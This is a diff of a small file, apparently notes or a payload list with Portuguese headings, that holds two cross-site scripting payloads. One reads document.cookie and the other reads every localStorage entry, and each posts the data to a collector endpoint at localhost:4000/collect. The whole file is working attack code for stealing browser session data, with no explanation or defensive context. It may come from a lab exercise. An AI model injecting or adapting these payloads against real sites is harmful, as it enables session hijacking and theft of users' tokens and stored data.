@@ -1,1 +1,5 @@
+PEGA OS COOKIES
 <script> fetch('http://localhost:4000/collect', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ cookies: document.cookie }) }); </script>
+
+PEGA O LOCAL STORAGE
+<script>   const localStorageData = {};   for (let i = 0; i < localStorage.length; i++) {     const key = localStorage.key(i);     localStorageData[key] = localStorage.getItem(key);   }    fetch('http://localhost:4000/collect', {     method: 'POST',     headers: {       'Content-Type': 'application/json',     },     body: JSON.stringify({ localStorage: localStorageData }),   }); </script>
